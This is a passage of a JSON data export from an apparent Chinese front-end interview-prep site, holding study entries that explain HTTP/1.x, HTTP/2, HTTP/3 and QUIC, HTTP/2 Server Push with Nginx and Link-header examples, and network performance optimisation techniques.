    "explanation": "### 前言\n\nHTTP/2 相比于 HTTP/1，可以说是大幅度提高了网页的性能，只需要升级到该协议就可以减少很多之前需要做的性能优化工作，当然兼容问题以及如何优雅降级应该是国内还不普遍使用的原因之一。\n\n虽然 HTTP/2 提高了网页的性能，但是并不代表它已经是完美的了，HTTP/3 就是为了解决 HTTP/2 所存在的一些问题而被推出来的。\n\n### 一、HTTP 协议\n\nHTTP 协议是 HyperText Transfer Protocol（超文本传输协议）的缩写，它是互联网上应用最为广泛的一种网络协议。所有的 WWW 文件都必须遵守这个标准。伴随着计算机网络和浏览器的诞生，HTTP1.0 也随之而来，处于计算机网络中的应用层，HTTP 是建立在 TCP 协议之上，所以**HTTP 协议的瓶颈及其优化技巧都是基于 TCP 协议本身的特性**，例如 tcp 建立连接的 3 次握手和断开连接的 4 次挥手以及每次建立连接带来的 RTT\n延迟时间。\n\n### 二、HTTP/1.x 的缺陷\n\n* **连接无法复用**：连接无法复用会导致每次请求都经历三次握手和慢启动。三次握手在高延迟的场景下影响较明显，慢启动则对大量小文件请求影响较大（没有达到最大窗口请求就被终止）。\n\n  + HTTP/1.0 传输数据时，每次都需要重新建立连接，增加延迟。\n  + HTTP/1.1 虽然加入 keep-alive 可以复用一部分连接，但域名分片等情况下仍然需要建立多个 connection，耗费资源，给服务器带来性能压力。\n* **Head-Of-Line Blocking（HOLB）**：导致带宽无法被充分利用，以及后续健康请求被阻塞。[HOLB](https://link.juejin.cn?target=http%3A%2F%2Fstackoverflow.com%2Fquestions%2F25221954%2Fspdy-head-of-line-blocking \"http://stackoverflow.com/questions/25221954/spdy-head-of-line-blocking\")是指一系列包（package）因为第一个包被阻塞；当页面中需要请求很多资源的时候，HOLB（队头阻塞）会导致在达到最大请求数量时，剩余的资源需要等待其他资源请求完成后才能发起请求。\n\n  + HTTP 1.0：下个请求必须在前一个请求返回后才能发出，`request-response`对按序发生。显然，如果某个请求长时间没有返回，那么接下来的请求就全部阻塞了。\n  + HTTP 1.1：尝试使用 pipeling 来解决，即浏览器可以一次性发出多个请求（同个域名，同一条 TCP 链接）。但 pipeling 要求返回是按序的，那么前一个请求如果很耗时（比如处理大图片），那么后面的请求即使服务器已经处理完，仍会等待前面的请求处理完才开始按序返回。所以，pipeling 只部分解决了 HOLB。\n\n[![](https://static.ecool.fun//article/c8b6d002-3011-42b5-8373-a4d1ecd064e8.awebp)](https://link.juejin.cn?target=https%3A%2F%2Fimage.fundebug.com%2F2019-03-06-1.png \"https://image.fundebug.com/2019-03-06-1.png\")\n\n如上图所示，红色圈出来的请求就因域名链接数已超过限制，而被挂起等待了一段时间。\n\n* **协议开销大**： HTTP1.x 在使用时，header 里携带的内容过大，在一定程度上增加了传输的成本，并且每次请求 header 基本不怎么变化，尤其在移动端增加用户流量。\n* **安全因素**：HTTP1.x 在传输数据时，所有传输的内容都是明文，客户端和服务器端都无法验证对方的身份，这在一定程度上无法保证数据的安全性\n\n### 三、SPDY 协议\n\n因为 HTTP/1.x 的问题，我们会引入雪碧图、将小图内联、使用多个域名等等的方式来提高性能。不过这些优化都绕开了协议，直到 2009 年，谷歌公开了自行研发的 SPDY 协议，主要解决 HTTP/1.1 效率不高的问题。谷歌推出 SPDY，才算是正式改造 HTTP 协议本身。降低延迟，压缩 header 等等，SPDY 的实践证明了这些优化的效果，也最终带来 HTTP/2 的诞生。\n\nSPDY 协议在 Chrome 浏览器上证明可行以后，就被当作 HTTP/2 的基础，主要特性都在 HTTP/2 之中得到继承。\n\n### 四、HTTP/2 简介\n\n2015 年，HTTP/2 发布。HTTP/2 是现行 HTTP 协议（HTTP/1.x）的替代，但它不是重写，HTTP 方法/状态码/语义都与 HTTP/1.x 一样。HTTP/2 基于 SPDY3，专注于**性能**，最大的一个目标是在用户和网站间只用一个连接（connection）。\n\nHTTP/2 由两个规范（Specification）组成：\n\n1. Hypertext Transfer Protocol version 2 - RFC7540\n2. HPACK - Header Compression for HTTP/2 - RFC7541\n\n### 五、HTTP/2 新特性\n\n#### 1. 二进制传输\n\nHTTP/2 采用二进制格式传输数据，而非 HTTP 1.x 的文本格式，二进制协议解析起来更高效。 HTTP / 1 的请求和响应报文，都是由起始行，首部和实体正文（可选）组成，各部分之间以文本换行符分隔。**HTTP/2 将请求和响应数据分割为更小的帧，并且它们采用二进制编码**。\n\n接下来我们介绍几个重要的概念：\n\n* 流：流是连接中的一个虚拟信道，可以承载双向的消息；每个流都有一个唯一的整数标识符（1、2…N）；\n* 消息：是指逻辑上的 HTTP 消息，比如请求、响应等，由一或多个帧组成。\n* 帧：HTTP 2.0 通信的最小单位，每个帧包含帧首部，至少也会标识出当前帧所属的流，承载着特定类型的数据，如 HTTP 首部、负荷，等等\n\n[![](https://static.ecool.fun//article/4f7dc244-85bd-429f-b5c5-48137f7554f8.awebp)](https://link.juejin.cn?target=https%3A%2F%2Fimage.fundebug.com%2F2019-03-06-2.png \"https://image.fundebug.com/2019-03-06-2.png\")\n\nHTTP/2 中，同域名下所有通信都在单个连接上完成，该连接可以承载任意数量的双向数据流。每个数据流都以消息的形式发送，而消息又由一个或多个帧组成。多个帧之间可以乱序发送，根据帧首部的流标识可以重新组装。\n\n#### 2. 多路复用\n\n在 HTTP/2 中引入了多路复用的技术。多路复用很好的解决了浏览器限制同一个域名下的请求数量的问题，同时也接更容易实现全速传输，毕竟新开一个 TCP 连接都需要慢慢提升传输速度。\n\n大家可以通过 [该链接](https://link.juejin.cn?target=https%3A%2F%2Fhttp2.akamai.com%2Fdemo \"https://http2.akamai.com/demo\") 直观感受下 HTTP/2 比 HTTP/1 到底快了多少。\n\n[![](https://static.ecool.fun//article/c16bcc0c-08dc-4ddd-866a-8389477131db.awebp)](https://link.juejin.cn?target=https%3A%2F%2Fimage.fundebug.com%2F2019-03-06-3.gif \"https://image.fundebug.com/2019-03-06-3.gif\")\n\n在 HTTP/2 中，有了二进制分帧之后，HTTP /2 不再依赖 TCP 链接去实现多流并行了，在 HTTP/2 中：\n\n* 同域名下所有通信都在单个连接上完成。\n* 单个连接可以承载任意数量的双向数据流。\n* 数据流以消息的形式发送，而消息又由一个或多个帧组成，多个帧之间可以乱序发送，因为根据帧首部的流标识可以重新组装。\n\n这一特性，使性能有了极大提升：\n\n* 同个域名只需要占用一个 TCP 连接，使用一个连接并行发送多个请求和响应,消除了因多个 TCP 连接而带来的延时和内存消耗。\n* 并行交错地发送多个请求，请求之间互不影响。\n* 并行交错地发送多个响应，响应之间互不干扰。\n* 在 HTTP/2 中，每个请求都可以带一个 31bit 的优先值，0 表示最高优先级， 数值越大优先级越低。有了这个优先值，客户端和服务器就可以在处理不同的流时采取不同的策略，以最优的方式发送流、消息和帧。\n\n[![](https://static.ecool.fun//article/6e672b5d-82cc-4940-b77c-d6060cabb2a2.awebp)](https://link.juejin.cn?target=https%3A%2F%2Fimage.fundebug.com%2F2019-03-06-4.png \"https://image.fundebug.com/2019-03-06-4.png\")\n\n如上图所示，多路复用的技术可以只通过一个 TCP 连接就可以传输所有的请求数据。\n\n#### 3. Header 压缩\n\n在 HTTP/1 中，我们使用文本的形式传输 header，在 header 携带 cookie 的情况下，可能每次都需要重复传输几百到几千的字节。\n\n为了减少这块的资源消耗并提升性能， HTTP/2 对这些首部采取了压缩策略：\n\n* HTTP/2 在客户端和服务器端使用“首部表”来跟踪和存储之前发送的键－值对，对于相同的数据，不再通过每次请求和响应发送；\n* 首部表在 HTTP/2 的连接存续期内始终存在，由客户端和服务器共同渐进地更新;\n* 每个新的首部键－值对要么被追加到当前表的末尾，要么替换表中之前的值\n\n例如下图中的两个请求， 请求一发送了所有的头部字段，第二个请求则只需要发送差异数据，这样可以减少冗余数据，降低开销\n\n[![](https://static.ecool.fun//article/aaf88ac9-8790-4d36-be35-bb0d603f9eea.awebp)](https://link.juejin.cn?target=https%3A%2F%2Fimage.fundebug.com%2F2019-03-06-5.png \"https://image.fundebug.com/2019-03-06-5.png\")\n\n### 4. Server Push\n\nServer Push 即服务端能通过 push 的方式将客户端需要的内容预先推送过去，也叫“cache push”。\n\n可以想象以下情况，某些资源客户端是一定会请求的，这时就可以采取服务端 push 的技术，提前给客户端推送必要的资源，这样就可以相对减少一点延迟时间。当然在浏览器兼容的情况下你也可以使用 prefetch。\n例如服务端可以主动把 JS 和 CSS 文件推送给客户端，而不需要客户端解析 HTML 时再发送这些请求。\n\n[![](https://static.ecool.fun//article/8dac36e9-f4ab-49df-b9fd-14d72c35a1c7.awebp)](https://link.juejin.cn?target=https%3A%2F%2Fimage.fundebug.com%2F2019-03-06-6.png \"https://image.fundebug.com/2019-03-06-6.png\")\n\n服务端可以主动推送，客户端也有权利选择是否接收。如果服务端推送的资源已经被浏览器缓存过，浏览器可以通过发送 RST\\_STREAM 帧来拒收。主动推送也遵守同源策略，换句话说，服务器不能随便将第三方资源推送给客户端，而必须是经过双方确认才行。\n\n### 六、HTTP/3 新特性\n\n#### 1. HTTP/3 简介\n\n虽然 HTTP/2 解决了很多之前旧版本的问题，但是它还是存在一个巨大的问题，主要是底层支撑的 TCP 协议造成的。\n\n上文提到 HTTP/2 使用了多路复用，一般来说同一域名下只需要使用一个 TCP 连接。但当这个连接中出现了丢包的情况，那就会导致 HTTP/2 的表现情况反倒不如 HTTP/1 了。\n\n因为在出现丢包的情况下，整个 TCP 都要开始等待重传，也就导致了后面的所有数据都被阻塞了。但是对于 HTTP/1.1 来说，可以开启多个 TCP 连接，出现这种情况反到只会影响其中一个连接，剩余的 TCP 连接还可以正常传输数据。\n\n那么可能就会有人考虑到去修改 TCP 协议，其实这已经是一件不可能完成的任务了。因为 TCP 存在的时间实在太长，已经充斥在各种设备中，并且这个协议是由操作系统实现的，更新起来不大现实。\n\n基于这个原因，**Google 就更起炉灶搞了一个基于 UDP 协议的 QUIC 协议，并且使用在了 HTTP/3 上**，HTTP/3 之前名为 HTTP-over-QUIC，从这个名字中我们也可以发现，HTTP/3 最大的改造就是使用了 QUIC。\n\nQUIC 虽然基于 UDP，但是在原本的基础上新增了很多功能，接下来我们重点介绍几个 QUIC 新功能。\n\n#### 2. QUIC 新功能\n\n* 0-RTT\n\n通过使用类似 TCP 快速打开的技术，缓存当前会话的上下文，在下次恢复会话的时候，只需要将之前的缓存传递给服务端验证通过就可以进行传输了。**0RTT 建连可以说是 QUIC 相比 HTTP2 最大的性能优势**。那什么是 0RTT 建连呢？\n\n这里面有两层含义:\n\n* 传输层 0RTT 就能建立连接。\n* 加密层 0RTT 就能建立加密连接。\n\n[![](https://static.ecool.fun//article/e1e109af-5832-452a-b8c5-1b0a919c1727.awebp)](https://link.juejin.cn?target=https%3A%2F%2Fimage.fundebug.com%2F2019-03-06-7.png \"https://image.fundebug.com/2019-03-06-7.png\")\n\n上图左边是 HTTPS 的一次完全握手的建连过程，需要 3 个 RTT。就算是会话复用也需要至少 2 个 RTT。\n\n而 QUIC 呢？由于建立在 UDP 的基础上，同时又实现了 0RTT 的安全握手，所以在大部分情况下，只需要 0 个 RTT 就能实现数据发送，在实现前向加密的基础上，并且 0RTT 的成功率相比 TLS 的会话记录单要高很多。\n\n* 多路复用\n\n虽然 HTTP/2 支持了多路复用，但是 TCP 协议终究是没有这个功能的。QUIC 原生就实现了这个功能，并且传输的单个数据流可以保证有序交付且不会影响其他的数据流，这样的技术就解决了之前 TCP 存在的问题。\n\n同 HTTP2.0 一样，同一条 QUIC 连接上可以创建多个 stream，来发送多个 HTTP 请求，但是，QUIC 是基于 UDP 的，一个连接上的多个 stream 之间没有依赖。比如下图中 stream2 丢了一个 UDP 包，不会影响后面跟着 Stream3 和 Stream4，不存在 TCP 队头阻塞。虽然 stream2 的那个包需要重新传，但是 stream3、stream4 的包无需等待，就可以发给用户。\n\n[![](https://static.ecool.fun//article/bdf88f62-cef4-464b-aabd-0ed2d9497ba4.awebp)](https://link.juejin.cn?target=https%3A%2F%2Fimage.fundebug.com%2F2019-03-06-8.png \"https://image.fundebug.com/2019-03-06-8.png\")\n\n另外 QUIC 在移动端的表现也会比 TCP 好。因为 TCP 是基于 IP 和端口去识别连接的，这种方式在多变的移动端网络环境下是很脆弱的。但是 QUIC 是通过 ID 的方式去识别一个连接，不管你网络环境如何变化，只要 ID 不变，就能迅速重连上。\n\n* 加密认证的报文\n\nTCP 协议头部没有经过任何加密和认证，所以在传输过程中很容易被中间网络设备篡改，注入和窃听。比如修改序列号、滑动窗口。这些行为有可能是出于性能优化，也有可能是主动攻击。\n\n但是 QUIC 的 packet 可以说是武装到了牙齿。除了个别报文比如 PUBLIC\\_RESET 和 CHLO，所有报文头部都是经过认证的，报文 Body 都是经过加密的。\n\n这样只要对 QUIC 报文任何修改，接收端都能够及时发现，有效地降低了安全风险。\n\n[![](https://static.ecool.fun//article/e33ea55f-0376-4f8c-a4c5-34b40fe92887.awebp)](https://link.juejin.cn?target=https%3A%2F%2Fimage.fundebug.com%2F2019-03-06-9.png \"https://image.fundebug.com/2019-03-06-9.png\")\n\n如上图所示，红色部分是 Stream Frame 的报文头部，有认证。绿色部分是报文内容，全部经过加密。\n\n* 向前纠错机制\n\nQUIC 协议有一个非常独特的特性，称为向前纠错 (Forward Error Correction，FEC)，每个数据包除了它本身的内容之外，还包括了部分其他数据包的数据，因此少量的丢包可以通过其他包的冗余数据直接组装而无需重传。向前纠错牺牲了每个数据包可以发送数据的上限，但是减少了因为丢包导致的数据重传，因为数据重传将会消耗更多的时间(包括确认数据包丢失、请求重传、等待新数据包等步骤的时间消耗)\n\n假如说这次我要发送三个包，那么协议会算出这三个包的异或值并单独发出一个校验包，也就是总共发出了四个包。当出现其中的非校验包丢包的情况时，可以通过另外三个包计算出丢失的数据包的内容。**当然这种技术只能使用在丢失一个包的情况下，如果出现丢失多个包就不能使用纠错机制了，只能使用重传的方式了**。\n\n### 七、总结\n\n* HTTP/1.x 有连接无法复用、队头阻塞、协议开销大和安全因素等多个缺陷\n* HTTP/2 通过多路复用、二进制流、Header 压缩等等技术，极大地提高了性能，但是还是存在着问题的\n* QUIC 基于 UDP 实现，是 HTTP/3 中的底层支撑协议，该协议基于 UDP，又取了 TCP 中的精华，实现了即快又可靠的协议",
    "testPoint": "在前端面试中，**HTTP/2 与 HTTP/3** 的考察，主要围绕它们对页面加载性能的影响、核心特性对比、底层协议差异以及使用中的优劣权衡。\n\n## 一、背景与版本演进\n\n| 协议版本     | 年份   | 核心变化                           |\n| -------- | ---- | ------------------------------ |\n| HTTP/1.1 | 1997 | 长连接（Keep-Alive）、管道化（但有队头阻塞）    |\n| HTTP/2   | 2015 | 二进制帧、多路复用、头部压缩、服务端推送           |\n| HTTP/3   | 2022 | 基于 QUIC 替代 TCP，进一步解决队头阻塞，提升可靠性 |\n\n## 二、HTTP/1.1 vs HTTP/2 vs HTTP/3 对比\n\n| 特性          | HTTP/1.1     | HTTP/2     | HTTP/3           |\n| ----------- | ------------ | ---------- | ---------------- |\n| 传输协议        | TCP          | TCP        | **QUIC（基于 UDP）** |\n| 多路复用        | ❌ 队头阻塞       | ✅ 同一连接并行传输 | ✅ 无队头阻塞          |\n| 首部压缩        | ❌ 无压缩        | ✅ HPACK    | ✅ QPACK（防止队头阻塞）  |\n| Server Push | ❌ 不支持        | ✅ 支持       | ❌ 已废弃（实践效果差）     |\n| 建连速度        | 普通 TCP + TLS | TCP + TLS  | ✅ 快速握手（1-RTT）    |\n| 丢包处理        | 影响所有流        | 影响所有流      | ✅ 仅影响单一流         |\n| 中间设备兼容性     | 高            | 高          | ⚠️ UDP 可能被阻断     |\n\n## 三、HTTP/2 的面试考察点\n\n### 1. 多路复用\n\n* 允许多个请求共用一个 TCP 连接，无需为每个资源新建连接\n* 消除了队头阻塞问题（HTTP/1.1 的阻塞问题）\n\n### 2. 二进制帧\n\n* 将请求和响应拆分成帧，使用帧来并发传输多个流\n* 帧类型有 HEADERS、DATA、SETTINGS、PUSH\\_PROMISE 等\n\n### 3. 头部压缩\n\n* 使用 **HPACK 算法** 对请求/响应头进行压缩\n* 减少重复头部带来的冗余传输（如 cookie、user-agent）\n\n### 4. Server Push（服务端推送）\n\n* 服务器在客户端请求 HTML 时，提前推送关联资源（如 CSS/JS）\n* 实际使用有限，难以控制时机与缓存，HTTP/3 中已废弃\n\n### 5. 与 CDN 的关系\n\n* 需要 CDN 和服务端都支持 HTTP/2\n* 常见 CDN 如 Cloudflare、阿里云均已支持\n\n## 四、HTTP/3 的面试考察点\n\n### 1. QUIC 协议（核心考点）\n\n* **基于 UDP**，支持多路复用，无需三次握手\n* 加密集成在协议中（类似 TLS 1.3），连接建立更快\n* **无队头阻塞**：丢包不会影响所有请求，只影响对应流\n\n### 2. QPACK 头部压缩算法\n\n* 类似 HPACK，但解决了在多路复用中可能造成阻塞的问题\n\n### 3. 快速恢复连接\n\n* QUIC 支持 0-RTT 连接恢复，提升访问速度（尤其移动网络）\n\n### 4. 防中间人攻击\n\n* QUIC 所有内容默认加密，提升安全性\n* 中间代理设备无法篡改请求内容\n\n### 5. 使用上的挑战\n\n* 部分网络设备不支持 UDP 或限制端口\n* 浏览器和 CDN 需明确支持 HTTP/3（如 Chrome、Cloudflare 支持）\n\n## 五、面试常见问题示例\n\n| 问题                       | 涉及考点                     |\n| ------------------------ | ------------------------ |\n| HTTP/2 和 HTTP/1.1 有哪些不同？ | 多路复用、帧机制、压缩、Server Push  |\n| HTTP/3 为什么使用 QUIC？       | 解决 TCP 队头阻塞、连接快、抗丢包      |\n| QUIC 相比 TCP 有什么优势？       | 基于 UDP、多路复用、低延迟连接        |\n| 为什么说 HTTP/2 仍然存在队头阻塞？    | 底层仍基于 TCP，TCP 丢包影响整条流    |\n| HTTP/3 是否取代 HTTP/2？      | 正在推广中，但需服务端、客户端、CDN 三方支持 |\n| Server Push 有什么问题？       | 资源浪费、缓存难控、已废弃            |\n\n## 六、实际使用和优化建议（工程落地）\n\n* 启用 HTTP/2/3 需后端或 CDN 支持（例如在 Nginx、Cloudflare 开启）\n* 前端不需要做太多改动，但要合理使用 preload 代替 server push\n* 对图片、CSS、JS 等静态资源分发，HTTP/2 提升明显\n* 对动态资源或高延迟网络访问，HTTP/3 的优势更大\n\n## 七、总结\n\n* 为什么 HTTP/2 引入多路复用？→ 解决 HTTP/1.1 队头阻塞\n* 为什么 HTTP/3 不再使用 TCP？→ TCP 层面的队头阻塞无法解决\n* 为什么 QUIC 比 TCP 快？→ 更快建连、单流丢包不影响整体\n* 为什么 Server Push 被废弃？→ 实际效果不佳，控制困难\n",
    "exerciseKeyList": "[\"d535efce-d820-4ad3-9723-e0e7373f542f\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2025-07-28T07:05:30.000Z",
    "updateAt": "2025-08-06T03:34:12.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "d535efce-d820-4ad3-9723-e0e7373f542f",
        "title": "HTTP1.0，HTTP1.1，HTTP2.0之间有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-03T06:43:03.000Z",
        "updateAt": "2024-08-10T17:06:48.000Z"
      }
    ]
  },
  "248": {
    "id": 248,
    "tagId": 16,
    "title": "http2.0 服务端推送",
    "explanation": "HTTP/2.0 的 **服务端推送（Server Push）** 是它相较于 HTTP/1.x 引入的一项重要功能，旨在优化网页加载性能，尤其是首次加载时资源依赖的获取效率。\n\n## 一、什么是服务端推送？\n\n**HTTP/2 Server Push** 允许服务器**主动将资源“推送”给客户端**，而不是等待客户端明确请求。这在某些场景下可以**预加载依赖资源、减少请求延迟**，提升页面的首屏加载速度。\n\n例如：\n客户端请求了 HTML 页面，服务器可以在返回 HTML 的同时，**主动推送**页面所需的 CSS/JS 资源。\n\n## 二、服务端推送的工作原理\n\n### 流程概览：\n\n1. 浏览器发送主资源请求（如 HTML）；\n2. 服务器识别该请求需要哪些依赖资源（如 CSS、JS）；\n3. 服务器将这些资源 **打包为 PUSH\\_PROMISE 帧** 发送给客户端，声明它即将发送的资源；\n4. 客户端接收到 `PUSH_PROMISE` 后，**会缓存该资源的响应**；\n5. 当浏览器稍后真正需要这个资源时，**不会再发起真实请求**，而是从缓存中获取推送的内容；\n6. 避免了请求的 RTT 往返延迟。\n\n### 技术细节：\n\n* **PUSH\\_PROMISE** 是 HTTP/2 中新增的帧类型，用于声明服务器准备推送的资源；\n* 所有推送的资源都绑定到一个主请求流（主页面），不能独立存在；\n* 客户端可选择 **拒绝（RST\\_STREAM）** 不想要的推送资源；\n* 推送资源会根据缓存策略存储在浏览器的缓存中，不一定立即使用。\n\n\n## 三、实际示例（Nginx + Link Header）\n\n在使用 Nginx 部署 HTTP/2 服务时，可以通过 `Link` 响应头启用 Server Push：\n\n```nginx\nlocation = /index.html {\n  http2_push /style.css;\n  http2_push /main.js;\n}\n```\n\n或者使用 `Link` 响应头方式：\n\n```http\nLink: </style.css>; rel=preload; as=style; nopush\nLink: </main.js>; rel=preload; as=script\n```\n\n* `nopush` 可用于告知浏览器只预加载但不使用服务端推送。\n\n\n## 四、应用场景与优劣权衡\n\n### 优点：\n\n* **减少资源加载的等待时间**：服务端提前推送关键资源；\n* **避免 RTT 往返**：客户端无需先请求才能获取资源；\n* **提升首屏加载速度**，尤其适合 HTML 首次加载时依赖静态资源的场景；\n\n### 局限与问题：\n\n* **浏览器支持不一致**，某些浏览器（如 Chrome）已经限制或禁用该功能；\n* **无法精准判断客户端是否已有缓存**，可能导致重复传输浪费带宽；\n* **容易造成推送资源冗余**，如果客户端并不需要，反而降低性能；\n* 由于 **HTTP/3（基于 QUIC）未保留 Server Push 功能**，该机制正逐渐淡出主流优化策略。\n\n\n## 五、现状与替代方案\n\n尽管 HTTP/2 Server Push 曾被视为重要性能特性，但在实际大规模部署中遇到了许多现实问题。目前主流建议更倾向于：\n\n* 使用 **`<link rel=\"preload\">`** 进行客户端主导的资源预加载；\n* 配合 Webpack、Rollup 等构建工具做资源拆分与按需加载；\n* 利用 CDN 和缓存控制优化加载路径；\n* 等待更成熟的 HTTP/3 和 QUIC 技术普及。",
    "testPoint": "HTTP/2 的服务端推送（**Server Push**）是一个重要但实际使用率较低的特性。它允许服务器在客户端还未明确请求资源时，**主动将资源“推送”给客户端**，用于提前加载关键资源以加快页面渲染。\n\n虽然 HTTP/3 取消了该功能，但面试中仍会从“机制原理 + 使用场景 + 弊端与替代方案”多个角度进行考察。\n\n## 一、基础原理考察\n\n### 1. 什么是 HTTP/2 的 Server Push？\n\n* 客户端发起一个主请求（如 HTML 页面）时，服务器可以在响应之前或同时，**主动推送**其它关联资源（如 CSS/JS）。\n* 客户端无需显式请求这些资源，它会缓存或使用服务端推送的内容。\n\n### 2. 工作机制\n\n* 浏览器发起请求 → 服务器通过 `PUSH_PROMISE` 帧声明要推送哪些资源\n* 客户端接收到声明后，可选择接受或拒绝（缓存中已有则拒绝）\n* 服务器随后发送资源 → 客户端使用或缓存\n\n## 二、使用场景考察\n\n* **页面关键资源预加载**：如首页 HTML 加载时提前推送 CSS/JS\n* **提升首屏加载速度**：配合缓存策略使用，在访问频繁页面中生效显著\n* **避免额外 RTT（请求-响应延迟）**\n\n## 三、配置与实现考察\n\n### 1. Nginx 示例：\n\n```nginx\nhttp2_push /styles.css;\nhttp2_push /main.js;\n```\n\n### 2. Express 示例（使用 `Link` 头）：\n\n```js\nres.set('Link', '</style.css>; rel=preload; as=style');\n```\n\n### 3. HTTP 响应头方式：\n\n```http\nLink: </styles.css>; rel=preload; as=style\n```\n\n> 注意：这种方式只在支持 HTTP/2 Server Push 的服务端生效。\n\n\n## 四、常见面试考点\n\n| 问题                            | 回答要点                                   |\n| ----------------------------- | -------------------------------------- |\n| HTTP/2 的 Server Push 原理？      | 主动发送 `PUSH_PROMISE`，减少 RTT，预加载资源       |\n| 与浏览器 preload 的区别？             | preload 是客户端主动告知，Server Push 是服务端主动    |\n| Server Push 如何实现？             | 使用 `Link` 头或服务器配置，依赖 HTTP/2            |\n| Server Push 有哪些缺陷？            | 资源可能已缓存、浪费带宽、无法精准控制推送时机                |\n| Server Push 为什么在 HTTP/3 中被废弃？ | 使用率低、不稳定、难以优化资源调度                      |\n| 如何替代 Server Push？             | 使用 preload、prefetch、Service Worker 缓存等 |\n\n\n## 五、缺陷与注意点考察\n\n* **缓存浪费问题**：如果客户端已经缓存资源，服务端仍然推送 → 浪费带宽\n* **调度不可控**：无法像 JS `preload` 那样设置优先级、资源时机\n* **对 CDN 不友好**：CDN 无法判断是否应推送资源\n* **浏览器支持差异**：部分浏览器已不再积极支持该特性\n* **现代替代方案更可控**：如 `<link rel=\"preload\">`、lazy loading\n\n",
    "exerciseKeyList": "[\"d535efce-d820-4ad3-9723-e0e7373f542f\"]",
    "vipLimit": 1,
    "level": 2.5,
    "pointOrder": 1,
    "createAt": "2025-07-28T07:22:06.000Z",
    "updateAt": "2025-08-06T02:18:37.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "d535efce-d820-4ad3-9723-e0e7373f542f",
        "title": "HTTP1.0，HTTP1.1，HTTP2.0之间有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-03T06:43:03.000Z",
        "updateAt": "2024-08-10T17:06:48.000Z"
      }
    ]
  },
  "249": {
    "id": 249,
    "tagId": 16,
    "title": "网络性能优化",
    "explanation": "浏览器在加载页面时，大量的性能瓶颈集中在资源的请求、传输、解析与执行上。因此，**网络层的性能优化**主要目标是：**减少请求次数、降低资源大小、缩短首屏时间、提升加载体验**。\n\n## 一、请求数量优化\n\n### 1. 合理拆分和合并资源\n\n* **按需加载（lazy loading / dynamic import）**：不一次加载所有模块，只加载当前页面/功能所需资源。\n* **资源合并（资源打包）**：减少请求数量，如合并多个 CSS/JS 文件（现代工具也支持 HTTP2 下保留拆分）。\n* **服务端渲染/预渲染**：减轻首屏资源请求压力。\n\n### 2. 使用缓存避免重复请求\n\n* 使用浏览器缓存控制（`Cache-Control`、`ETag`、`Last-Modified`）；\n* 对于不变资源，设置强缓存（`immutable`）；\n* 对接口返回数据做缓存（前端缓存策略或 HTTP 层缓存）；\n* 本地缓存，如 IndexedDB / LocalStorage 存储接口数据。\n\n---\n\n## 二、资源体积优化\n\n### 1. 压缩与代码优化\n\n* 启用 Gzip / Brotli 压缩静态资源（HTML、CSS、JS）；\n* 压缩图像（WebP、AVIF）、字体、视频等媒体资源；\n* 减少 polyfill 体积（如使用 `core-js` 按需引入）；\n* 移除无用代码（Tree Shaking、CSS Purge、babel-plugin-transform-remove-console）；\n\n### 2. 精简传输内容\n\n* 请求接口时使用精简字段、分页、后端裁剪；\n* GraphQL 可按需返回字段，减少冗余数据传输；\n* 降低 Cookie 和请求头大小，避免请求体负担。\n\n---\n\n## 三、加载顺序与优先级优化\n\n### 1. 关键资源优先加载\n\n* 使用 `preload`、`prefetch`、`dns-prefetch` 等 `<link>` 标签提示浏览器提前加载；\n* 使用 Webpack 的资源预加载配置控制打包 chunk 优先级；\n* 首屏资源内联（inline critical CSS）避免阻塞渲染。\n\n### 2. 非关键资源延后加载\n\n* 图片懒加载（`loading=\"lazy\"`、IntersectionObserver）；\n* JS 异步加载（`<script async|defer>`）；\n* 第三方 SDK、监控等可延迟初始化。\n\n---\n\n## 四、协议与传输层优化\n\n### 1. 使用 HTTP/2 或 HTTP/3\n\n* 多路复用，减少 TCP 连接数，提高并发请求效率；\n* 头部压缩与服务器推送（HTTP/2 Push）；\n* HTTP/3 基于 QUIC，有更快的连接建立速度与更少的丢包重传。\n\n### 2. 减少不必要的重定向\n\n* 避免链式跳转；\n* 减少使用 302/301 等中间状态跳转，优化首次加载路径。\n\n---\n\n## 五、安全策略与跨域优化\n\n* 合理设置 `CORS`，减少 preflight 请求；\n* 使用同源策略时避免冗余 OPTIONS 请求；\n* 减少跨域请求带来的额外开销（如 DNS、TLS 握手等）。\n\n---\n\n## 六、CDN 与资源分发优化\n\n* 使用 CDN 加速静态资源访问，减少物理距离造成的 RTT；\n* 使用全局 CDN 覆盖，支持边缘缓存与智能调度；\n* 配合版本号和 Hash 控制缓存刷新策略。\n\n---\n\n## 七、服务端协同优化\n\n* 接口合并：多个小请求可由后端合并为一次大请求返回；\n* 接口压缩与限流：避免无用数据占带宽；\n* 优化接口响应结构与字段粒度；\n* 为前端提供异步批量资源接口（如配置/字典项/用户信息等合并加载）；\n\n---\n\n## 八、实际指标与监控优化点\n\n* 首字节时间（TTFB）优化；\n* 首屏渲染时间（FCP、LCP）优化；\n* 页面总加载时间（Fully Loaded）优化；\n* 网络错误率（如资源 404、接口失败率）监控；\n* 使用 Performance API、Web Vitals、Lighthouse 工具分析网络瓶颈。\n\n---\n\n### 要点总结\n\n* 网络优化的本质是：**更快、更少、更智能地请求资源**；\n* 从请求数量、资源大小、传输协议、加载优先级、缓存策略、CDN 分发等多个维度同时入手；\n* 优化不是单一操作，而是**持续评估、定位瓶颈、迭代调整**的过程；\n* 实际开发中建议结合 Chrome DevTools、Lighthouse、Performance API 等工具进行精细化分析与验证。\n",
